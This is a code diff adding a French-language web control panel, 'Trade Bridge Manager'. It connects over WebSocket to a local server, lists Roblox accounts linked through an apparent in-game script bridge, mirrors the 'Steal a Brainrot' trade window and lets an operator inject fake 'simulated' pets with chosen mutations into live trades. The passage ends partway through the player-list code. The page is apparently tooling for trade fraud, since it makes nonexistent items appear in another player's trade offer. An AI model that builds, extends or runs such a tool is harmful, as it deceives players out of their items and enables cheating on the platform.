@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Trade Bridge Manager</title>
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Lucide Icons -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <!-- Google Fonts (Plus Jakarta Sans) -->
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      background-color: #f8fafc; /* Blanc cassé très propre */
+      color: #1e293b; /* Ardoise sombre */
+    }
+    /* Scrollbar minimaliste chic */
+    ::-webkit-scrollbar {
+      width: 5px;
+    }
+    ::-webkit-scrollbar-track {
+      background: transparent;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #cbd5e1;
+      border-radius: 10px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #94a3b8;
+    }
+    .legit-card {
+      background: #ffffff;
+      border: 1px solid #e2e8f0;
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.03), 0 2px 4px -2px rgba(0, 0, 0, 0.02);
+      border-radius: 16px;
+    }
+    .custom-shadow {
+      box-shadow: 0 10px 15px -3px rgba(16, 185, 129, 0.04), 0 4px 6px -4px rgba(16, 185, 129, 0.02);
+    }
+  </style>
+</head>
+<body class="min-h-screen overflow-x-hidden antialiased pb-12">
+
+  <!-- En-tête de page -->
+  <header class="w-full py-4 px-6 md:px-12 flex justify-between items-center bg-white border-b border-slate-200 sticky top-0 z-50 shadow-sm shadow-slate-100">
+    <div class="flex items-center space-x-3">
+      <div class="bg-emerald-50 py-2 px-2.5 rounded-xl border border-emerald-100">
+        <i data-lucide="shuffle" class="w-5 h-5 text-emerald-600"></i>
+      </div>
+      <div>
+        <h1 class="text-lg md:text-xl font-extrabold tracking-tight text-slate-900">
+          Trade Bridge Manager
+        </h1>
+        <p class="text-[10px] text-slate-500 font-bold uppercase tracking-wider">Live Control Platform</p>
+      </div>
+    </div>
+    
+    <div class="flex items-center space-x-2">
+      <!-- Indicateur d'état connecté ultra propre et discret -->
+      <div class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></div>
+      <span class="text-xs font-semibold text-slate-600">En ligne</span>
+    </div>
+  </header>
+
+  <!-- Grille Principale -->
+  <main class="max-w-7xl mx-auto px-4 md:px-8 mt-8 grid grid-cols-1 lg:grid-cols-12 gap-8">
+    
+    <!-- SECTION GAUCHE : LISTE DES JOUEURS (4 colonnes) -->
+    <section class="lg:col-span-4 flex flex-col space-y-4">
+      <div class="legit-card p-5 flex flex-col">
+        <div class="flex items-center justify-between mb-4 pb-2 border-b border-slate-100">
+          <h2 class="text-xs font-extrabold text-slate-500 tracking-wider flex items-center gap-2 uppercase">
+            <i data-lucide="users" class="w-4 h-4 text-slate-400"></i> Sessions Actives
+          </h2>
+          <span id="user-count" class="bg-emerald-50 border border-emerald-100 text-emerald-700 text-[10px] font-extrabold px-2 py-0.5 rounded-full">
+            0 connecté
+          </span>
+        </div>
+        
+        <!-- Liste de défilement des utilisateurs -->
+        <div id="users-list" class="flex flex-col space-y-3 max-h-[500px] overflow-y-auto pr-1">
+          <div class="text-center py-12 text-slate-400 text-xs font-medium">
+            <i data-lucide="monitor-off" class="w-8 h-8 mx-auto mb-2 text-slate-300"></i>
+            Aucun compte connecté au pont...
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION DROITE : CONTRÔLEUR DE TRADE (8 colonnes) -->
+    <section class="lg:col-span-8 flex flex-col space-y-6">
+      
+      <!-- Écran d'attente (si aucun compte sélectionné) -->
+      <div id="no-selected-user" class="legit-card p-12 flex flex-col items-center justify-center text-center h-[560px]">
+        <div class="p-4 rounded-full bg-slate-50 border border-slate-100 mb-4 text-slate-400">
+          <i data-lucide="mouse-pointer-click" class="w-10 h-10 animate-bounce"></i>
+        </div>
+        <h3 class="text-sm font-extrabold text-slate-800 uppercase tracking-wider mb-1">Sélectionnez un Compte</h3>
+        <p class="text-xs text-slate-500 max-w-xs leading-relaxed">
+          Choisissez un compte en ligne dans la colonne de gauche pour charger sa console de monitoring de trade.
+        </p>
+      </div>
+
+      <!-- ÉCRAN DE CONTRÔLE PRINCIPAL (Masqué par défaut) -->
+      <div id="control-panel" class="hidden flex flex-col space-y-6">
+        
+        <!-- Carte de profil du joueur ciblé -->
+        <div class="legit-card p-5 flex items-center justify-between">
+          <div class="flex items-center space-x-4">
+            <img id="target-avatar" src="" class="w-14 h-14 rounded-full border border-slate-200 bg-slate-50 shadow-inner" alt="Avatar">
+            <div>
+              <div class="flex items-center gap-1.5">
+                <span id="target-display-name" class="font-extrabold text-slate-900 text-base">DisplayName</span>
+                <span id="target-username" class="text-xs text-slate-400 font-semibold">@Username</span>
+              </div>
+              <p class="text-[10px] text-slate-500 font-bold uppercase tracking-wider mt-0.5">ID : <span id="target-client-id" class="font-mono text-emerald-600">clientId</span></p>
+            </div>
+          </div>
+          <div id="target-trade-badge" class="px-3 py-1.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border">
+            HORS ÉCHANGE
+          </div>
+        </div>
+
+        <!-- Alerte : Pas d'échange en cours -->
+        <div id="not-in-trade-warning" class="legit-card p-12 flex flex-col items-center text-center justify-center text-slate-400">
+          <i data-lucide="help-circle" class="w-10 h-10 mb-2 text-slate-300"></i>
+          <p class="text-xs font-semibold text-slate-600">Aucun échange en cours sur ce compte Roblox.</p>
+          <p class="text-[10px] text-slate-400 mt-1 max-w-xs leading-relaxed">Le panneau de contrôle apparaîtra automatiquement dès qu'un échange sera initié en jeu.</p>
+        </div>
+
+        <!-- ZONE DE SIMULATION ACTIVE (Affichée uniquement en Trade) -->
+        <div id="trade-controls" class="hidden flex flex-col space-y-6">
+          
+          <!-- RÉPLIQUE DE L'UI DE TRADE ROBLOX (LIVE GRID PREVIEW) -->
+          <div class="legit-card p-6 flex flex-col space-y-4 relative overflow-hidden bg-white">
+            <div class="flex items-center justify-between border-b border-slate-100 pb-3">
+              <h3 class="text-xs font-extrabold text-slate-500 tracking-wider flex items-center gap-2 uppercase">
+                <i data-lucide="monitor" class="w-4 h-4 text-emerald-500"></i> Live Trade Preview
+              </h3>
+              <div class="flex items-center gap-1.5 bg-emerald-50 border border-emerald-100 px-2.5 py-1 rounded-full text-[10px] text-emerald-700 font-bold uppercase tracking-wider">
+                <span class="w-1.5 h-1.5 bg-emerald-500 rounded-full"></span> Sync actif
+              </div>
+            </div>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+              
+              <!-- CÔTÉ GAUCHE : MOI (YOUR OFFER) -->
+              <div class="bg-slate-50 rounded-xl p-4 border border-slate-100 flex flex-col min-h-[220px]">
+                <div class="flex justify-between items-center mb-3">
+                  <span id="your-offer-title" class="text-[10px] font-extrabold tracking-wider text-slate-600 uppercase">YOUR OFFER</span>
+                  <span id="your-offer-count" class="text-[10px] font-extrabold text-emerald-600">0/16</span>
+                </div>
+                <!-- Ready State Box -->
+                <div id="your-ready-box" class="bg-slate-50 border border-slate-100 p-2 rounded-xl flex items-center justify-between transition-all duration-200 mb-2">
+                  <span id="your-ready-text" class="text-xs font-extrabold text-slate-400">EN ATTENTE</span>
+                  <div id="your-ready-icon-box" class="p-1.5 rounded-lg bg-slate-200/50 text-slate-400">
+                    <i data-lucide="clock" class="w-3 h-3"></i>
+                  </div>
+                </div>
+                <!-- Grille d'items -->
+                <div id="your-offer-items" class="grid grid-cols-2 gap-2 flex-grow overflow-y-auto max-h-[250px] pr-1">
+                  <div class="col-span-2 flex flex-col items-center justify-center text-center py-10 text-slate-400">
+                    <i data-lucide="info" class="w-6 h-6 mb-1 opacity-50"></i>
+                    <p class="text-[10px] font-semibold">Aucun animal offert.</p>
+                  </div>
+                </div>
+              </div>
+              
+              <!-- CÔTÉ DROIT : ADVERSAIRE (THEIR OFFER) -->
+              <div class="bg-slate-50 rounded-xl p-4 border border-slate-100 flex flex-col min-h-[220px]">
+                <div class="flex justify-between items-center mb-3">
+                  <span id="other-offer-title" class="text-[10px] font-extrabold tracking-wider text-slate-600 uppercase">THEIR OFFER</span>
+                  <span id="other-offer-count" class="text-[10px] font-extrabold text-slate-500">0/16</span>
+                </div>
+                <!-- Ready State Box -->
+                <div id="other-ready-box" class="bg-slate-50 border border-slate-100 p-2 rounded-xl flex items-center justify-between transition-all duration-200 mb-2">
+                  <span id="other-ready-text" class="text-xs font-extrabold text-slate-400">EN ATTENTE</span>
+                  <div id="other-ready-icon-box" class="p-1.5 rounded-lg bg-slate-200/50 text-slate-400">
+                    <i data-lucide="clock" class="w-3 h-3"></i>
+                  </div>
+                </div>
+                <!-- Grille d'items -->
+                <div id="other-offer-items" class="grid grid-cols-2 gap-2 flex-grow overflow-y-auto max-h-[250px] pr-1">
+                  <div class="col-span-2 flex flex-col items-center justify-center text-center py-10 text-slate-400">
+                    <i data-lucide="info" class="w-6 h-6 mb-1 opacity-50"></i>
+                    <p class="text-[10px] font-semibold">Aucun animal offert.</p>
+                  </div>
+                </div>
+              </div>
+              
+            </div>
+          </div>
+
+          <!-- Section : Ajout de Brainrot Fictif -->
+          <div class="legit-card p-6 flex flex-col space-y-4">
+            <h3 class="text-xs font-extrabold text-slate-500 tracking-wider flex items-center gap-2 uppercase">
+              <i data-lucide="plus-circle" class="w-4 h-4 text-emerald-500"></i> Ajouter un animal simulé
+            </h3>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <!-- Sélection de l'animal -->
+              <div class="flex flex-col space-y-1.5 relative">
+                <label class="text-[10px] text-slate-500 font-extrabold uppercase tracking-wider">Nom du Brainrot (Recherche) :</label>
+                <input type="text" id="pet-name" placeholder="Tapez pour rechercher..." autocomplete="off" class="bg-slate-50 border border-slate-200 rounded-xl px-4 py-2.5 text-sm text-slate-800 focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500">
+                <!-- Conteneur d'autocomplétion -->
+                <div id="pet-suggestions" class="hidden absolute top-full left-0 right-0 max-h-48 overflow-y-auto bg-white border border-slate-200 rounded-xl z-50 mt-1 shadow-lg"></div>
+              </div>
+              
+              <!-- Mutation -->
+              <div class="flex flex-col space-y-1.5">
+                <label class="text-[10px] text-slate-500 font-extrabold uppercase tracking-wider">Mutation :</label>
+                <select id="pet-mutation" class="bg-slate-50 border border-slate-200 rounded-xl px-4 py-2.5 text-sm text-slate-800 focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500">
+                  <option value="">Aucune (Normal)</option>
+                  <option value="Golden">Golden</option>
+                  <option value="Diamond">Diamond</option>
+                  <option value="Lava">Lava</option>
+                  <option value="Galaxy">Galaxy</option>
+                  <option value="Radioactive">Radioactive</option>
+                  <option value="Rainbow">Rainbow</option>
+                  <option value="Candy">Candy</option>
+                  <option value="Divine">Divine</option>
+                  <option value="Cyber">Cyber</option>
+                  <option value="Bloodrot">Bloodrot</option>
+                  <option value="Cursed">Cursed</option>
+                  <option value="YinYang">YinYang</option>
+                </select>
+              </div>
+            </div>
+
+            <button id="btn-add-pet" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-extrabold text-xs py-3 rounded-xl transition duration-200 flex items-center justify-center gap-2 tracking-wider uppercase shadow-md shadow-emerald-500/10">
+              <i data-lucide="plus" class="w-4 h-4"></i> ADD BRAINROT
+            </button>
+          </div>
+
+        </div>
+
+      </div>
+
+    </section>
+
+  </main>
+
+  <script>
+    // Initialiser les icônes Lucide
+    lucide.createIcons();
+
+    // Se connecter au WebSocket du serveur Node.js local (Double-route pour compatibilité totale)
+    const ws = new WebSocket(`ws://${window.location.host}/browser?type=browser`);
+    
+    let connectedPlayers = [];
+    let selectedClientId = null;
+
+    // Charger les avatars Roblox via le proxy d'image local de manière 100% robuste
+    function loadAvatar(userId, imgElementId) {
+      const img = document.getElementById(imgElementId);
+      if (img) {
+        const uid = userId && userId !== 0 && userId !== '0' ? userId : 1;
+        img.src = `/avatar/${uid}?t=${Date.now()}`;
+      }
+    }
+
+    // Cache pour l'API Fandom
+    const fandomCache = {};
+
+    // Charger la photo de l'animal depuis le Fandom Wiki de manière insensible à la casse
+    async function loadPetImage(petName, imgElementId) {
+      const formattedName = petName.trim();
+      if (fandomCache[formattedName]) {
+        const img = document.getElementById(imgElementId);
+        if (img) {
+          img.src = fandomCache[formattedName];
+          img.classList.remove('hidden');
+        }
+        const fallback = document.getElementById(`fallback-${imgElementId}`);
+        if (fallback) fallback.classList.add('hidden');
+        return;
+      }
+
+      const tryLoadImage = async (wikiTitle) => {
+        const res = await fetch(`https://stealabrainrot.fandom.com/api.php?action=query&titles=${encodeURIComponent(wikiTitle)}&prop=pageimages&format=json&pithumbsize=150&origin=*`);
+        const json = await res.json();
+        const pages = json?.query?.pages;
+        if (pages) {
+          const pageId = Object.keys(pages)[0];
+          if (pageId && pageId !== "-1" && pages[pageId]?.thumbnail?.source) {
+            return pages[pageId].thumbnail.source;
+          }
+        }
+        return null;
+      };
+
+      let imageUrl = null;
+
+      try {
+        // Essai 1 : Titre exact formaté avec underscores (format Wiki standard)
+        const underscoreTitle = formattedName.replace(/\s+/g, '_');
+        imageUrl = await tryLoadImage(underscoreTitle);
+
+        // Essai 2 : Recherche MediaWiki si le titre direct échoue
+        if (!imageUrl) {
+          const searchRes = await fetch(`https://stealabrainrot.fandom.com/api.php?action=query&list=search&srsearch=${encodeURIComponent(formattedName)}&format=json&origin=*`);
+          const searchJson = await searchRes.json();
+          const searchResult = searchJson?.query?.search?.[0];
+          if (searchResult && searchResult.title) {
+            imageUrl = await tryLoadImage(searchResult.title);
+          }
+        }
+      } catch (e) {
+        console.error("Erreur Fandom image:", e);
+      }
+
+      const img = document.getElementById(imgElementId);
+      const fallback = document.getElementById(`fallback-${imgElementId}`);
+
+      if (imageUrl) {
+        fandomCache[formattedName] = imageUrl;
+        if (img) {
+          img.src = imageUrl;
+          img.classList.remove('hidden');
+        }
+        if (fallback) fallback.classList.add('hidden');
+      } else {
+        if (img) img.classList.add('hidden');
+        if (fallback) fallback.classList.remove('hidden');
+      }
+    }
+
+    // Associer un émoji d'animal en fonction du nom du brainrot pour plus de réalisme
+    function getAnimalEmoji(name) {
+      const nameLower = name.toLowerCase();
+      if (nameLower.includes("dog") || nameLower.includes("chien")) return "🐶";
+      if (nameLower.includes("cat") || nameLower.includes("chat")) return "🐱";
+      if (nameLower.includes("rabbit") || nameLower.includes("lapin") || nameLower.includes("bunny")) return "🐰";
+      if (nameLower.includes("dragon")) return "🐲";
+      if (nameLower.includes("unicorn") || nameLower.includes("licorne")) return "🦄";
+      if (nameLower.includes("elephant")) return "🐘";
+      if (nameLower.includes("lion")) return "🦁";
+      if (nameLower.includes("bear") || nameLower.includes("ours")) return "🐻";
+      if (nameLower.includes("bird") || nameLower.includes("oiseau")) return "🐦";
+      if (nameLower.includes("wolf") || nameLower.includes("loup")) return "🐺";
+      if (nameLower.includes("frog") || nameLower.includes("grenouille")) return "🐸";
+      return "🐾";
+    }
+
+    // Rendre la grille d'items de trade
+    function renderOfferItems(containerId, items, isOther) {
+      const container = document.getElementById(containerId);
+      if (!container) return;
+      container.innerHTML = '';
+      
+      if (!items || items.length === 0) {
+        container.innerHTML = `
+          <div class="col-span-2 flex flex-col items-center justify-center text-center py-10 text-slate-400">
+            <i data-lucide="info" class="w-6 h-6 mb-1 opacity-50"></i>
+            <p class="text-[10px] font-semibold">Aucun animal offert.</p>
+          </div>
+        `;
+        lucide.createIcons();
+        return;
+      }
+      
+      items.forEach((item, index) => {
+        const card = document.createElement('div');
+        const cardBg = item.isFake ? 'bg-orange-50 border-orange-200/60 shadow-orange-100/50 shadow-inner' : 'bg-slate-100/50 border-slate-200/50';
+        
+        // Ajouter un petit bouton de suppression en haut à droite des items simulés !
+        const safeName = escapeHtml(item.name);
+        const deleteButton = item.isFake 
+          ? `<button onclick="removeFakePet('${safeName}')" class="absolute top-1 right-1 p-0.5 rounded-full bg-orange-200 hover:bg-orange-300 text-orange-700 transition duration-150 z-10 scale-90">
+               <i data-lucide="x" class="w-2.5 h-2.5"></i>
+             </button>`
+          : '';
+          
+        const uniqueImgId = `pet-img-${containerId}-${index}`;
+        
+        card.className = `p-3 rounded-xl border flex flex-col items-center justify-center text-center relative ${cardBg}`;
+        card.innerHTML = `
+            ${deleteButton}
+            <!-- Image Fandom Wiki -->
+            <img id="${uniqueImgId}" src="" class="w-12 h-12 object-contain mb-1 hidden" alt="">
+            <!-- Fallback Icône Lucide -->
+            <div id="fallback-${uniqueImgId}" class="w-12 h-12 mb-1 hidden flex items-center justify-center text-slate-300">
+              <i data-lucide="image-off" class="w-6 h-6"></i>
+            </div>
+            
+            <p class="font-bold text-[10px] text-slate-800 truncate max-w-full leading-tight" title="${safeName}">${safeName}</p>
+            <p class="text-[9px] font-extrabold text-emerald-600 mt-1">${item.value}</p>
+        `;
+        container.appendChild(card);
+        
+        // Charger la vraie image depuis Fandom de manière asynchrone
+        loadPetImage(item.name, uniqueImgId);
+      });
+      lucide.createIcons();
+    }
+
+    // Supprimer un pet simulé de l'échange
+    function removeFakePet(petName) {
+      sendCommand('remove_fake_pet', { petName });
+    }
+
+    // LOGIQUE D'AUTO-COMPLÉTION DES USERS ET DES PETS
+    // Liste de fallback si le script Lua n'envoie pas encore animalsList
+    const FALLBACK_ANIMALS = [
+      "1x1x1x1","25","67","Abyssaloco","Admin Lucky Block","Agarrini la Palini","Alessio","Anpali Babel","Antonio","Appelini","Aquanaut","Arcadopus","Arcadragon","Astrolero Cervalero","Avocadini Antilopini","Avocadini Guffo","Avocadorilla","Bacuru and Egguru","Ballerina Cappuccina","Ballerina Peppermintina","Ballerino Lololo","Bambini Crostini","Bambu Bambu Sahur","Bananita Dolphinita","Bananito","Bananito Bandito","Bandito Axolito","Bandito Bobritto","Baskito","Baskito Egg","Bee Loco","Belula Beluga","Berenjello Angello","Berryno","Bisonte Giuppitere","Blackhole Goat","Blueberrinni Octopusini","Boatito Auratito","Boba Panda","Bombardini Tortinii","Bombardiro Crocodilo","Bombardiro Vaccariro","Bombombini Gusini","Boneca Ambalabu","Boppin Bunny","Brainrot God Lucky Block","Brasilini Berimbini","Brr Brr Patapim","Brr es Teh Patipum","Brri Brri Bicus Dicus Bombicus","Brunito Marsito","Brutto Gialutto","Bucketoro","Buho de Fuego","Buho de Noelo","Buho de Volto","Buho del Cielo","Bulbito Bandito Traktorito","Bunito Bunito Spinito","Bunny Bunny Bunny Sahur","Bunny Bunny Bunny Sahur Egg","Bunny Tralala","Bunny Tralala Egg","Bunny and Eggy","Bunnyman","Buntteo","Buntteo Egg","Burbaloni Loliloli","Burguro And Fryuro","Burrito Bandito",
+      "Cacasito Satalito","Cachorrito Melonito","Cacto Hipopotamo","Camera Ramena","Capi Taco","Capitano Gullini","Capitano Moby","Cappuccino Assassino","Cappuccino Clownino","Caramello Filtrello","Carloo","Carrotini Brainini","Cash or Card","Cavallo Virtuoso","Caylusaurus","Celestial Pegasus","Celularcini Viciosini","Centrucci Nuclucci","Cerberus","Chachechi","Chef Crabracadabra","Chicleteira Bicicleteira","Chicleteira Cupideira","Chicleteira Noelteira","Chicleteirina Bicicleteirina","Chihuanini Taconini","Chill Puppy","Chillin Chili","Chimnino","Chimpanzini Bananini","Chipso and Queso","Chocco Bunny","Chrismasmamat","Churrito Bunnito","Churrito Bunnito Egg","Cigno Fulgoro","Clickerino Crabo","Cloverat Clapat","Clovkur Kurkur","Coco and Mango","Cocoa Assassino","Cocofanto Elefanto","Cocosini Mama","Cocoteddy","Cola Cat","Cooki and Milki","Corn Corn Corn Sahur","Crabbo Limonetta","Cuadramat and Pakrahmatmamat","Cupcake Koala","Cupid Cupid Sahur","Cupid Hotspot",
+      "DJ Panda","Digi Narwhal","Divino Platypio","Doi Doi Do","Dolphini Jetskini","Donkeyturbo Express","Dragon Aquanini","Dragon Cannelloni","Dragon Gingerini","Dug dug dug","Duggy Bros","Dul Dul Dul","Dumborino Miracello",
+      "Easter Easter Easter Sahur","Easter Easter Easter Sahur Egg","Egg Lucky Block","Eggdin Egg Egg Dun","Eggdin Egg Egg Dun Egg","Eid Eid Eid Sahur","Electro Quacko","Elefanto Frigo","Esok Sekolah","Espresso Signora","Eviledon","Extinct Ballerina","Extinct Matteo","Extinct Tralalero",
+      "Festive 67","Festive Lucky Block","Fishboard","Fishino Clownino","Fizzy Soda","Flancito","Flipa Sandala","Flippo Marino","Fluriflura","Fortunu and Cashuru","Foxini Lanternini","Fragola La La La","Fragrama and Chocrama","Frankentteo","Frigo Camelo","Frio Ninja","Frogato Pirato","Frogo Elfo","Futbolini Skatini",
+      "GOAT","Ganganzelli Trulala","Gangster Footera","Garama and Madundung","Gato Celesto","Gattatino Nyanino","Gattito Tacoto","Giftini Spyderini","Ginger Cisterna","Ginger Gerat","Ginger Globo","Girafa Celestre","Glaciator","Globa Steppa","Glorbo Fruttodrillo","Gobblino Uniciclino","Gold Egg","Gold Elf","Gold Gold Gold","Gorillo Subwoofero","Gorillo Watermelondrillo","Graipuss Medussi","Granchiello Spiritell","Granny","Griffin","Guerriro Digitale","Guest 666","Gym Bros",
+      "Harpuccino","Headless Horseman","Heart Lucky Block","Ho Ho Ho Sahur","Holy Arepa","Hopilikalika Hopilikalako","Hopilikalika Hopilikalako Egg","Horegini Boom","Hydra Bunny","Hydra Bunny Egg","Hydra Dragon Cannelloni",
+      "Jacko Jack Jack","Jacko Spaventosa","Jackorilla","Jelly Moby","Jingle Jingle Sahur","Job Job Job Sahur","John Doe","John Pork","Jolly Jolly Sahur",
+      "Kalika Bros","Karker Sahur","Karkerheart Luvkur","Karkerkar Kurkur","Ketchuru and Musturu","Ketupat Bros","Ketupat Kepat","Krupuk Pagi Pagi",
+      "La Anniversary Grande","La Casa Boo","La Cucaracha","La Easter Grande","La Extinct Grande","La Food Combinasion","La Ginger Sekolah","La Grande Combinasion","La Jolly Grande","La Karkerkar Combinasion","La Lucky Grande","La Romantic Grande","La Sahur Combinasion","La Secret Combinasion","La Spooky Grande","La Supreme Combinasion","La Taco Combinasion","La Vacca Jacko Linterino","La Vacca Lepre Lepreino","La Vacca Prese Presente","La Vacca Saturno Saturnita","Las Capuchinas","Las Sis","Las Tralaleritas","Las Vaquitas Saturnitas","Lavadorito Spinito","Lazy Ducky","Lemonita Splashita","Leprechaun Lucky Block","Lerulerulerule","Lionel Cactuseli","Lirilì Larilà","List List List Sahur","Los 25","Los 67","Los Amigos","Los Bombinitos","Los Bros","Los Bunitos","Los Bunitos Egg","Los Burritos","Los Candies","Los Chicleteiras","Los Chihuaninis","Los Chillis","Los Combinasionas","Los Crocodillitos","Los Cucarachas","Los Cupids","Los Gattitos","Los Hackers","Los Hotspotsitos","Los Jobcitos","Los Jolly Combinasionas","Los Karkeritos","Los Lucky Blocks","Los Mariachis","Los Matteos","Los Mi Gatitos","Los Mobilis","Los Noobinis","Los Nooo My Hotspotsitos","Los Orcalitos","Los Planitos","Los Primos","Los Puggies","Los Quesadillas","Los Sekolahs","Los Spaghettis","Los Spooky Combinasionas","Los Spyderinis","Los Sweethearts","Los Taco Blocks","Los Tacoritas","Los Tipi Tacos","Los Tortus","Los Tralaleritos","Los Trios","Los Tungtungtungcitos","Love Love Bear","Love Love Love Sahur","Lovin Rose","Luck Luck Luck Sahur","Lumaca Malefica","Luv Luv Luv",
+      "Magi Ribbitini","Malame Amarele","Mangolini Parrocini","Mariachi Corazoni","Mastodontico Telepiedone","Matteo","Meowl","Mi Gatito","Mieteteira Bicicleteira","Money Money Bros","Money Money Man","Money Money Puggy","Money Money Reindeer","Mummio Rappitto","Mummy Ambalabu","Mythic Lucky Block",
+      "Nacho Spyder","Naughty Naughty","Noo La Polizia","Noo my Candy","Noo my Eggs","Noo my Eggs Egg","Noo my Gold","Noo my Heart","Noo my Present","Noo my examine","Noobini Pizzanini","Noobini Santanini","Nooo My Hotspot","Nuclearo Dinossauro",
+      "Odin Din Din Dun","Ombrello Topolino","Orangutini Ananassini","Orbi Mochi","Orcaledon","Orcalero Orcala","Orcalita Orcala",
+      "Pakrahmatmamat","Pakrahmatmatina","Pancake and Syrup","Pandaccini Bananini","Pandanini Frostini","Paradiso Axolottino","Patteo","Pengolino Nuvoletto","Penguin Tree","Penguino Cocosino","Perochello Lemonchello","Perrito Burrito","Pi Pi Watermelon","Piccione Macchina","Piccionetta Macchina","Pinealotto Fruttarino","Pineaplino","Pipi Avocado","Pipi Corni","Pipi Kiwi","Pipi Potato","Pirulitoita Bicicleteira","Please my Present","Pop Pop Sahur","Popcuru and Fizzuru","Pot Hotspot","Pot Pumpkin","Premium Egg Lucky Block","Premium Festive Lucky Block","Premium Heart Lucky Block","Premium Leprechaun Lucky Block","Pretzo Robo","Puffaball","Pumpkini Spyderini",
+      "Quackini Snackini","Quackini Snackini Egg","Quackula","Quesadilla Crocodila","Quesadillo Vampiro","Quivioli Ameleonni",
+      "Raccooni Jandelini","Rang Ring Bus","Reindeer Tralala","Reinito Sleighito","Rhino Helicopterino","Rhino Toasterino","Rico Dinero","Robo Grafito","Rocco Disco","Rosetti Tualetti","Rosey and Teddy","Rubrikiko",
+      "Salamino Penguino","Sammyni Cakini","Sammyni Fattini","Sammyni Spyderini","Santa Hotspot","Santteo","Sealo Regalo","Secret Lucky Block","Serafinna Medusella","Seraphino Gruyero","Sigma Boy","Sigma Girl","Signore Carapace","Skibidi Toilet","Skull Skull Skull","Snailenzo","Snailo Clovero","Spaghetti Tualetti","Spinny Hammy","Spioniro Golubiro","Spongini Quackini","Spooky Lucky Block","Spooky and Pumpky","Spyder Elephant","Squalanana","Steakini Fattini","Stoppo Luminino","Strawberrelli Flamingelli","Strawberrita","Strawberry Elephant","Sundrilla Sundae","Svinina Bombardino","Swag Soda","Swaggy Bros",
+      "Ta Ta Ta Ta Sahur","Taco Lucky Block","Tacorillo Crocodillo","Tacorita Bicicleta","Talpa Di Fero","Tang Tang Keletang","Tartaragno","Tartaruga Cisterna","Te Te Te Sahur","Telemorte","Tenini Ballini","Tentacolo Tecnico","Ti Ti Ti Sahur","Tictac Sahur","Tigrilini Watermelini","Tigroligre Frutonni","Tim Cheese","Tipi Topi Taco","Tirilikalika Tirilikalako","To to to Sahur","Tob Tobi Tobi","Toiletto Focaccino","Tootini Shrimpini","Torrtuginni Dragonfrutini","Tracoducotulu Delapeladustuz","Tractoro Dinosauro","Tralaledon","Tralalero Tralala","Tralalita Tralala","Tree Tree Tree Sahur","Trenostruzzo Turbo 3000","Trenostruzzo Turbo 4000","Trenotubo Axolotrico 9000","Tric Trac Baraboom","Trickolino","Triplito Tralaleritos","Trippi Troppi","Trippi Troppi Troppa Trippa","Trulimero Trulicina","Tuff Toucan","Tukanno Bananno",
+      "Unclito Samito","Urubini Flamenguini",
+      "Vampira Cappucina","Ventoliero Pavonero","Vulturino Skeletono",
+      "W or L","Wheelchair Granny","Wombo Rollo",
+      "Yess my examine","Yeti Claus",
+      "Zibra Zubra Zibralini","Zombie Tralala"
+    ];
+    let availableAnimals = [];
+    const petNameInput = document.getElementById('pet-name');
+    const petSuggestionsContainer = document.getElementById('pet-suggestions');
+
+    petNameInput.addEventListener('input', () => {
+      const query = petNameInput.value.toLowerCase().trim();
+      renderSuggestions(query);
+    });
+
+    petNameInput.addEventListener('focus', () => {
+      const query = petNameInput.value.toLowerCase().trim();
+      renderSuggestions(query);
+    });
+
+    document.addEventListener('click', (e) => {
+      if (e.target !== petNameInput && e.target !== petSuggestionsContainer) {
+        petSuggestionsContainer.classList.add('hidden');
+      }
+    });
+
+    function renderSuggestions(query) {
+      petSuggestionsContainer.innerHTML = '';
+      
+      const matches = availableAnimals.filter(name => name.toLowerCase().includes(query));
+      
+      if (matches.length > 0) {
+        petSuggestionsContainer.classList.remove('hidden');
+        matches.forEach(name => {
+          const btn = document.createElement('button');
+          btn.className = "w-full text-left px-4 py-2.5 text-xs text-slate-700 hover:bg-slate-50 hover:text-slate-900 transition duration-150 border-b border-slate-100 last:border-0";
+          btn.type = "button";
+          btn.innerText = name;
+          btn.onclick = () => {
+            petNameInput.value = name;
+            petSuggestionsContainer.classList.add('hidden');
+          };
+          petSuggestionsContainer.appendChild(btn);
+        });
+      } else {
+        petSuggestionsContainer.classList.add('hidden');
+      }
+    }
+
+    ws.onopen = () => {
+      console.log("[WS] Connecté au serveur central");
+    };
+
+    ws.onclose = () => {
+      console.log("[WS] Déconnecté du serveur central");
+    };
+
+    ws.onmessage = (event) => {
+      try {
+        const data = JSON.parse(event.data);
+        if (data.type === 'players_update') {
+          connectedPlayers = data.players;
+          renderPlayersList();
+          
+          // Mettre à jour l'affichage du joueur sélectionné s'il est toujours en ligne
+          if (selectedClientId) {
+            const player = connectedPlayers.find(p => p.id === selectedClientId);
+            if (player) {
+              const serverList = player.playerInfo.animalsList;
+              availableAnimals = (serverList && serverList.length > 0) ? serverList : FALLBACK_ANIMALS;
+              updateControlPanel(player);
+            } else {
+              // Le joueur s'est déconnecté
+              selectedClientId = null;
+              document.getElementById('control-panel').classList.add('hidden');
+              document.getElementById('no-selected-user').classList.remove('hidden');
+            }
+          }
+        }
+      } catch (err) {
+        console.error("[WS] Erreur de traitement du message :", err);
+      }
+    };
+
+    // Rendre la liste des joueurs connectés
+    function renderPlayersList() {
+      const listContainer = document.getElementById('users-list');
+      document.getElementById('user-count').innerText = `${connectedPlayers.length} connecté`;
+
+      if (connectedPlayers.length === 0) {
+        listContainer.innerHTML = `
+          <div class="text-center py-12 text-slate-400 text-xs font-medium">
